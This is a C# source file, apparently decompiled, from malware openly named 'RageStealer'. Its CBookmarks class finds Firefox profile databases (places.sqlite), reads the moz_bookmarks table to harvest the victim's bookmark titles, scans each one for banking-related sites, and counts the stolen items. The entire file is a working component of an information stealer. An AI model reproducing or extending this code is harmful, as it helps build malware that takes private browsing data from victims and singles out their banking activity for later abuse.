using System;
using System.Collections.Generic;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;
using RageStealer.Target.Browsers.Chromium;

namespace RageStealer.Target.Browsers.Firefox;

internal class CBookmarks
{
	private static string GetBookmarksDbPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return null;
	}

	public static List<Bookmark> Get(string path)
	{
		List<Bookmark> list = new List<Bookmark>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(GetBookmarksDbPath(path), "moz_bookmarks");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Bookmark bookmark = default(Bookmark);
				bookmark.Title = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(sqLite.GetValue(i, 5));
				Bookmark item = bookmark;
				if (RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(sqLite.GetValue(i, 1)).Equals("0") && !(item.Title == "0"))
				{
					list.Add(item);
					Banking.ScanData(item.Title);
					Counter.Bookmarks++;
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
